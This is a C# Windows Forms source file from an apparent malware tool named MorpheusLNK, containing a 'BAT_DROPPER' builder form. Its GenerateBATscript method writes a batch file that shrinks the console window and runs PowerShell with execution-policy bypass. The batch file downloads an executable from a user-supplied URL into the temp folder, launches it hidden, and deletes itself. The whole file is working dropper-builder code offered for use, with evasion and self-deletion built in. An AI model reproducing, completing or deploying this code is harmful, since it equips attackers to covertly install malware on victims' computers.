using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MorpheusLNK
{
    public partial class BAT_DROPPER : Form
    {
        public BAT_DROPPER()
        {
            InitializeComponent();
        }

        private void batBuild_btn_Click(object sender, EventArgs e)
        {
            string url = downloadUrl_Box.Text;
            string exeName = afterExe_Name.Text;

            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(exeName))
            {
                SetStatusLabel("Status: Error form cannot be empty!", Color.Red);
                return;
            }

            try
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                saveFileDialog1.Filter = "BAT files|*.bat";
                saveFileDialog1.Title = "Save BAT Scriptlet";
                saveFileDialog1.ShowDialog();

                if (saveFileDialog1.FileName != "")
                {
                    string filePath = saveFileDialog1.FileName;
                    string batContent = GenerateBATscript(url, exeName);
                    File.WriteAllText(filePath, batContent);
                    SetStatusLabel("BAT script created successfully!", Color.Green);
                }
                else
                {
                    SetStatusLabel("Status: BAT script build failed!", Color.Red);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"{ex}");
            }
        }

        private string GenerateBATscript(string url, string exeName)
        {
            string powerShellCommand = $"Invoke-WebRequest -Uri \"{url}\" -OutFile \"$env:temp\\{exeName}\"; Start-Process -FilePath \"$env:temp\\{exeName}\" -WindowStyle Hidden";
            string batScript = $@"
mode 15,1
@echo off
powershell.exe -ep bypass -Command {powerShellCommand}
del %0
";
            return batScript;
        }

        private async void SetStatusLabel(string text, Color color)
        {
            statusLabel.ForeColor = color;
            statusLabel.Text = text;
            await Task.Delay(3000);
            statusLabel.Text = "";
        }
    }
}
